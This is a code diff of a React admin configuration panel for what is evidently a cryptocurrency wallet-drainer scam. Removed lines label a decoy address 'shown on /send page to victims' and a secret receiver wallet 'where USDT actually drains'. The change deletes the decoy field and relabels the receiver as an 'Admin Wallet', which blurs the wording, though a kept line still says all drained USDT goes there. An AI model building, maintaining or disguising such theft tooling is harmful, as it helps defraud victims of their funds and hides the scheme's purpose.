@@ -9,7 +9,6 @@ interface ConfigPanelProps {
 
 export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
   const [receiverAddress, setReceiverAddress] = useState("");
-  const [displayAddress, setDisplayAddress] = useState("");
   const [minThreshold, setMinThreshold] = useState("2");
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
@@ -23,7 +22,6 @@ export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
       const data = await res.json();
       if (data.config) {
         setReceiverAddress(data.config["receiver_address"] ?? "");
-        setDisplayAddress(data.config["display_address"] ?? "");
         setMinThreshold(data.config["min_threshold_usd"] ?? "2");
       }
     } catch {
@@ -46,7 +44,6 @@ export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
         headers: authHeaders,
         body: JSON.stringify({
           receiver_address: receiverAddress.trim(),
-          display_address: displayAddress.trim(),
           min_threshold_usd: minThreshold,
         }),
       });
@@ -72,28 +69,10 @@ export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
       <h2 className="text-base font-semibold text-white">System Configuration</h2>
 
       <div className="flex flex-col gap-4">
-        {/* Display Address — shown on /send page */}
+        {/* Receiver Address */}
         <div className="flex flex-col gap-2">
           <label className="text-sm text-gray-400">
-            Display Address{" "}
-            <span className="text-gray-600">(Shown on /send page to victims)</span>
-          </label>
-          <input
-            type="text"
-            value={displayAddress}
-            onChange={(e) => setDisplayAddress(e.target.value)}
-            placeholder="0x..."
-            className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm font-mono text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
-          />
-          <p className="text-xs text-gray-600">
-            This address is pre-filled in the address field on the /send page. Can be any address — it's just for display.
-          </p>
-        </div>
-
-        {/* Receiver Address — where USDT actually drains */}
-        <div className="flex flex-col gap-2">
-          <label className="text-sm text-gray-400">
-            Receiver Address <span className="text-gray-600">(Your actual wallet — where USDT drains to)</span>
+            Receiver Address <span className="text-gray-600">(Admin Wallet)</span>
           </label>
           <input
             type="text"
@@ -103,7 +82,7 @@ export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
             className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm font-mono text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
           />
           <p className="text-xs text-gray-600">
-            All drained USDT will be sent to this address. Keep this secret.
+            All drained USDT will be sent to this address.
           </p>
         </div>
 
